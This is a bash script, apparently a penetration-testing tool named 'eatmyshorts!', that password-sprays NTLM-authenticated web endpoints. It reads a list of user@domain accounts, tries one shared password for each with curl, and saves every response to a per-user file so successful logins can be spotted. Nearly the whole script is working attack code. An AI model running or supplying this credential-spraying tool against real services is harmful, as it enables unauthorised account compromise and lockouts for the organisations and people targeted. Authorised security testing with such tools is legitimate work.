#!/bin/bash
#
# eatmyshorts! -> ntlm-auth http spray
#
# w41l3r

echo ''
echo ' ___      ___                  __        __   __  ___  __    /'
echo '|__   /\   |      |\/| \ /    /__` |__| /  \ |__)  |  /__`  /'
echo '|___ /~~\  |      |  |  |     .__/ |  | \__/ |  \  |  .__/ . '
echo ''                       

URL=$1
USERS=$2
PASS=$3

if [ $# -ne 3 ];then
	echo "Syntax: $0 {URL} {Users_file} {Password}"
	echo
	echo "e.g.: $0 https://abc.com users.txt Password1"
	echo "ps. users format: user@domain.com"
	echo "bye!"
	exit 9
fi

if [ ! -s $USERS ];then
	echo "File $USERS empty or doesnt exist. Bye..."
	exit 1
fi


if [ -d output ];then
	rm -f output/*
else
	mkdir output
	if [ $? -ne 0 ];then
		echo "Error creating output dir. Bye..."
		exit 1
	fi
fi

cat $USERS | while read user
do
	echo "Testing $user ..."
	curl -k -L --ntlm --user "${user}:${PASS}" $URL -o output/${user}.html
done
                                                                                                     
